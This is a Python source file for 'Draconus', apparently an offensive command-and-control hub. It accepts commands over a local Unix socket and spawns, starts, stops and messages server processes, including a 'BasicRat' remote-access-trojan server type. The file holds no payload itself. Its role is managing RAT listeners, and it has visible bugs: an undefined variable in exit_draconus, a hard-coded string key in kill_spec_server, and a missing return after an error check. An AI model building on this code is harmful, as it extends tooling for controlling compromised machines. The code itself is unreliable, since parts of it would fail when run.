import os
import socket
import sys
import json

from time import sleep
from multiprocessing import Pipe

from draconus.CONFIG import FORMAT_CODE_COMMUNICATION, SOCKETS_DIR, DRACO_SOCKET_RAW_LEN
from draconus import Logger, EchoServer, TestServer, BasicRat, TestAdv


class Draconus:
    def __init__(self, dev=False):
        self.name = "DRACONUS"
        self._sockets_dir = SOCKETS_DIR
        self._my_socket = os.path.join(self._sockets_dir, "DRACO_SOCKET")
        self._format = FORMAT_CODE_COMMUNICATION
        self._raw_len = DRACO_SOCKET_RAW_LEN
        self._dev = dev
        self._tmp_json = None
        self._conn = None
        self._addr = None
        self._direct_canal = None        
        self.PIPES = {}
        self.SERVERS = {}
        self.TYPE_SERVERS = {
            EchoServer.SERV_TYPE : EchoServer,
            TestServer.SERV_TYPE : TestServer,
            BasicRat.SERV_TYPE : BasicRat,
            TestAdv.SERV_TYPE : TestAdv
        }




    def make_file(self):
        if not os.path.exists(self._sockets_dir):
            os.mkdir(self._sockets_dir)
        if os.path.exists(self._my_socket):
            try:
                os.unlink(self._my_socket)
                return True
            except Exception as e:
                self.Log(f"ERROR Socket build: {e}")
                return False
        
        return True
    
    def _build_server(self):
        try:
            self.server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            self.server.bind(self._my_socket)
            self.server.listen(1)
            self.Log(f"Local Server Build Successfull")
            return True
        except Exception as e:
            self.Log(f"Build Socket Error: {e}")
            return False

    
    def _build(self):
        self.Log = Logger(prints=self._dev)
        if not self.make_file() or not self._build_server():
            self.Log(f"ERROR: Draconus Cant Start")
            sys.exit()
    
    def _accept_conn(self):
        self._conn, self._addr = self.server.accept()
        self.Log("DRACONUS Connected to Commnad Center")
        self._reset_direct_canal()
        # self._send_msg("Welcome To Draconus")
    
    def _recv_json(self):
        recv = self._recv_msg()
        if not recv:
            return None
        try:
            data = json.loads(recv)
            return data
        except:
            return None
    
    
    def _recv_msg(self):
        msg = b""
        while True:
            try:
                recv = self._conn.recv(self._raw_len)
            except:
                return None
            if recv:
                if len(recv) < self._raw_len:
                    msg += recv
                    break
                else:
                    msg += recv
            else:
                return None
        return msg.decode(self._format)

    def _send_msg(self, msg):
        if isinstance(msg, str):
            msg = msg.encode(self._format)
        self._conn.send(msg)
    
    def _make_direct_canal(self, name):
        canal = self.PIPES.get(name)
        print("self.PIPES: ", self.PIPES)
        print("name: ", name)
        if not canal:
            self._send_msg("\n[DRACONUS] ERROR: Server does not exist\n")
            return None
        self._direct_canal = canal
        self._send_msg(f"\n[DRACONUS] Created direct communication with '{name}' server")
        return True
    
    def _reset_direct_canal(self):
        self._direct_canal = None
    
    def make_server(self, **config):
        self.Log(f"TYP CONFIG: {type(config)}")
        s_name = config.get("NAME")
        if s_name in self.SERVERS:
            self._send_msg(f"[DRACONUS] ERROR: Server {s_name} Exist")
            return False
        serv_type = config.get("SERV_TYPE")
        if not serv_type in self.TYPE_SERVERS:
            self._send_msg("[DRACONUS] ERROR: Wrong server type")
            return False
        serv_type = self.TYPE_SERVERS[serv_type]
        
        too_draco, too_serv = Pipe()
        
        self.SERVERS[s_name] = serv_type(too_serv, **config)
        self.PIPES[s_name] = too_draco
        self.SERVERS[s_name].start()
        if config.get("START_NOW"):
            too_draco.send("start")
        return True
    
    def start_server(self, name):
        serv = self.PIPES.get(name)
        if not serv:
            self._send_msg("[DRACONUS] ERROR: Server does not exist")
            return False
        serv.send("start")
        return True
    
    def stop_server(self, name):
        serv = self.PIPES.get(name)
        if not serv:
            self._send_msg("[DRACONUS] ERROR: Server does not exist")
            return False
        serv.send("stop")
        return True
    
    def kill_spec_server(self, name):
        if name not in self.SERVERS:
            self._send_msg("[DRACONUS] ERROR: Server does not exist")
        try:
            self.SERVERS[name].terminate()
        except:
            self._send_msg("[DRACONUS] [!!] Cant terminate process. Trying kill ....")
            try:
                self.SERVERS["name"].kill()
            except:
                self._send_msg("[DRACONUS] ERROR: Cant kill process !! Try terminate Draconus")
                return False
        del self.SERVERS[name]
        del self.PIPES[name]
        self._send_msg("[DRACONUS] Server Delete Successfull")
        return True

    

    def exit_draconus(self):
        self._send_msg("[DRACONUS] Stoping Draconus ....")
        for s in self.SERVERS:
            try:
                self.SERVERS[c].terminate()
            except:
                try:
                    self.SERVERS[c].kill()
                except:
                    pass
        sleep(0.5)
        self._send_msg("[SYSTEM] Draconus Exit")
        sys.exit()

    def show_config(self):
        if len(self.PIPES) == 0:
            self._send_msg("[DRACONUS] No servers created")
            return True
        for s in self.PIPES:
            self.PIPES[s].send("conf")
            sleep(0.5)
    
    def show_serv_types(self):
        buff = "\n--------------- Server Types ----------------------\n"
        for s in self.TYPE_SERVERS:
            buff += f"--- Type: {self.TYPE_SERVERS[s].SERV_TYPE}\n--- Description: {self.TYPE_SERVERS[s].INFO_SERV}\n"
            buff += "--------------------------------------------------------------------------------------\n"
        self._send_msg(buff)

    
    def need_config(self, serv_name):
        pipe = self.PIPES.get(serv_name)
        pipe.send("$conf")

        


    

    def exec_command(self, command):
        if self._direct_canal and command == "EXIT":
            self._reset_direct_canal()
            return True
        if self._direct_canal:
            self._direct_canal.send(command)
            return True
        if command == "JSON":
            self._tmp_json = self._recv_json()
            self.Log(f"Recive data:\n{self._tmp_json}")
        elif command == "TEST":
            self._send_msg("[DRACONUS] Test Message")
        elif command == "MAKE":
            self.Log(f"Recive data:\n{self._tmp_json}")
            self.make_server(**self._tmp_json)
        elif command.startswith("start"):
            name = command.split(" ")
            self.start_server(name[1])
        elif command.startswith("stop"):
            name = command.split(" ")
            self.stop_server(name[1])
        elif command.startswith("canal"):
            name = command.split(" ")
            self._make_direct_canal(name[1])
        elif command == "conf":
            self.show_config()
        elif command.startswith("$conf"):
            name = command.lstrip("$conf").strip(" ")
            self.need_config(name)
        elif command.startswith("kill"):
            name = command.lstrip("kill").strip(" ")
            self.kill_spec_server(name)
        elif command == "DRACO STOP":
            self.exit_draconus()
        elif command == "serv types":
            self.show_serv_types()
        else:
            self._send_msg("Unknown Command")



    def begin(self):
        self._build()
        while True:
            self._accept_conn()
            while True:
                command = self._recv_msg()
                if command == "":
                    continue
                if not command:
                    break
                self.Log(f"COMMANDS: {command}")
                self.exec_command(command)





##############

if __name__ == "__main__":
    DRACO = Draconus(dev=True)
    DRACO.begin()


